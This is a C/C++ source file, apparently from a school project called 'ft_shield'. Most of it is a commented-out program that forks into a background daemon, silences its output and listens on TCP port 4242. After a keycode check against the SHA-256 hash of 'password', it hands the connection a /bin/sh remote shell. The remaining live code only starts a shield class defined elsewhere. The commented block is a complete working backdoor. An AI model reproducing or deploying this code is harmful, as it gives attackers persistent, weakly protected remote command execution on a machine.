//  #include <stdio.h>
// #include <stdlib.h>
// #include <string.h>
// #include <unistd.h>
// #include <sys/types.h>
// #include <sys/socket.h>
// #include <netinet/in.h>
// #include <arpa/inet.h>
// #include <openssl/sha.h>
// #include <fcntl.h>
// #include <sys/stat.h>
// #include <cerrno>

// #define PORT 4242
// #define MAX_CLIENTS 3
// #define PASSWORD_HASH "5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8" // SHA-256 hash of "password"

// void daemonize() {
//     pid_t pid = fork();
//     if (pid < 0) {
//         // Log error to a file
//         int log_fd = open("/tmp/ft_shield.log", O_WRONLY | O_CREAT | O_APPEND, 0644);
//         if (log_fd >= 0) {
//             dprintf(log_fd, "Failed to fork: %s\n", strerror(errno));
//             close(log_fd);
//         }
//         exit(EXIT_FAILURE);
//     }
//     if (pid > 0) {
//         exit(EXIT_SUCCESS);
//     }
//     if (setsid() < 0) {
//         // Log error to a file
//         int log_fd = open("/tmp/ft_shield.log", O_WRONLY | O_CREAT | O_APPEND, 0644);
//         if (log_fd >= 0) {
//             dprintf(log_fd, "Failed to create new session: %s\n", strerror(errno));
//             close(log_fd);
//         }
//         exit(EXIT_FAILURE);
//     }
//     umask(0);
//     chdir("/");

//     // Redirect standard input, output, and error to /dev/null
//     close(STDIN_FILENO);
//     close(STDOUT_FILENO);
//     close(STDERR_FILENO);
//     open("/dev/null", O_RDONLY); // stdin
//     open("/dev/null", O_WRONLY); // stdout
//     open("/dev/null", O_WRONLY); // stderr
// }

// #include <openssl/evp.h>

// void sha256_hash(const char *string, char outputBuffer[65]) {
//     unsigned char hash[EVP_MAX_MD_SIZE];
//     unsigned int lengthOfHash = 0;
//     EVP_MD_CTX *context = EVP_MD_CTX_new();

//     if (context != NULL) {
//         if (EVP_DigestInit_ex(context, EVP_sha256(), NULL)) {
//             if (EVP_DigestUpdate(context, string, strlen(string))) {
//                 if (EVP_DigestFinal_ex(context, hash, &lengthOfHash)) {
//                     for (unsigned int i = 0; i < lengthOfHash; i++) {
//                         sprintf(outputBuffer + (i * 2), "%02x", hash[i]);
//                     }
//                     outputBuffer[lengthOfHash * 2] = 0;
//                 }
//             }
//         }
//         EVP_MD_CTX_free(context);
//     }
// }

// int authenticate(int client_socket) {
//     char buffer[256];
//     char hash[65];
//     int attempts = 3;

//     while (attempts > 0) {
//         memset(buffer, 0, sizeof(buffer));
//         send(client_socket, "Keycode: ", 9, 0);
//         read(client_socket, buffer, sizeof(buffer) - 1);
//         buffer[strcspn(buffer, "\n")] = 0;

//         sha256_hash(buffer, hash);
//         if (strcmp(hash, PASSWORD_HASH) == 0) {
//             send(client_socket, "Authenticated!\n", 15, 0);
//             return 1;
//         } else {
//             send(client_socket, "Invalid keycode. Attempts left: ", 30, 0);
//             char msg[10];
//             sprintf(msg, "%d\n", --attempts);
//             send(client_socket, msg, strlen(msg), 0);
//         }
//     }
//     send(client_socket, "Too many failed attempts. Disconnecting...\n", 42, 0);
//     return 0;
// }

// void handle_client(int client_socket) {
//     if (authenticate(client_socket)) {
//         send(client_socket, "Welcome! Type 'shell' to spawn a remote shell.\n", 47, 0);
//         char buffer[256];
//         while (1) {
//             memset(buffer, 0, sizeof(buffer));
//             read(client_socket, buffer, sizeof(buffer) - 1);
//             buffer[strcspn(buffer, "\n")] = 0;

//             if (strcmp(buffer, "shell") == 0) {
//                 send(client_socket, "Spawning shell...\n", 18, 0);
//                 dup2(client_socket, 0);
//                 dup2(client_socket, 1);
//                 dup2(client_socket, 2);
//                 execl("/bin/sh", "sh", NULL);
//                 break;
//             } else {
//                 send(client_socket, "Unknown command. Type 'shell' to spawn a remote shell.\n", 54, 0);
//             }
//         }
//     }
//     close(client_socket);
// }
// int main() {
//     int server_fd, new_socket;
//     struct sockaddr_in address;
//     int opt = 1;
//     int addrlen = sizeof(address);

//     // Log start of the program
//     int log_fd = open("/tmp/ft_shield.log", O_WRONLY | O_CREAT | O_APPEND, 0644);
//     if (log_fd >= 0) {
//         dprintf(log_fd, "Starting ft_shield...\n");
//     }

//     daemonize();

//     if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0) {
//         if (log_fd >= 0) {
//             dprintf(log_fd, "Socket creation failed: %s\n", strerror(errno));
//             close(log_fd);
//         }
//         exit(EXIT_FAILURE);
//     }

//     if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt, sizeof(opt))) {
//         if (log_fd >= 0) {
//             dprintf(log_fd, "Setsockopt failed: %s\n", strerror(errno));
//             close(log_fd);
//         }
//         exit(EXIT_FAILURE);
//     }

//     address.sin_family = AF_INET;
//     address.sin_addr.s_addr = INADDR_ANY;
//     address.sin_port = htons(PORT);

//     if (bind(server_fd, (struct sockaddr *)&address, sizeof(address)) < 0) {
//         if (log_fd >= 0) {
//             dprintf(log_fd, "Bind failed: %s\n", strerror(errno));
//             close(log_fd);
//         }
//         exit(EXIT_FAILURE);
//     }

//     if (listen(server_fd, MAX_CLIENTS) < 0) {
//         if (log_fd >= 0) {
//             dprintf(log_fd, "Listen failed: %s\n", strerror(errno));
//             close(log_fd);
//         }
//         exit(EXIT_FAILURE);
//     }

//     if (log_fd >= 0) {
//         dprintf(log_fd, "Server started and listening on port %d\n", PORT);
//         close(log_fd);
//     }

//     while (1) {
//         if ((new_socket = accept(server_fd, (struct sockaddr *)&address, (socklen_t*)&addrlen)) < 0) {
//             // Log accept errors
//             int log_fd = open("/tmp/ft_shield.log", O_WRONLY | O_CREAT | O_APPEND, 0644);
//             if (log_fd >= 0) {
//                 dprintf(log_fd, "Accept failed: %s\n", strerror(errno));
//                 close(log_fd);
//             }
//             continue;
//         }

//         pid_t pid = fork();
//         if (pid < 0) {
//             // Log fork errors
//             int log_fd = open("/tmp/ft_shield.log", O_WRONLY | O_CREAT | O_APPEND, 0644);
//             if (log_fd >= 0) {
//                 dprintf(log_fd, "Fork failed: %s\n", strerror(errno));
//                 close(log_fd);
//             }
//             close(new_socket);
//         } else if (pid == 0) {
//             close(server_fd);
//             handle_client(new_socket);
//             exit(0);
//         } else {
//             close(new_socket);
//         }
//     }

//     return 0;
// }

#include "shield.hpp"

int main() {
    try {
        shield ft_shield;
        ft_shield.start();
    } catch (const std::exception& e) {
        std::cerr << "Error: " << e.what() << std::endl;
        return 1;
    }
    return 0;
}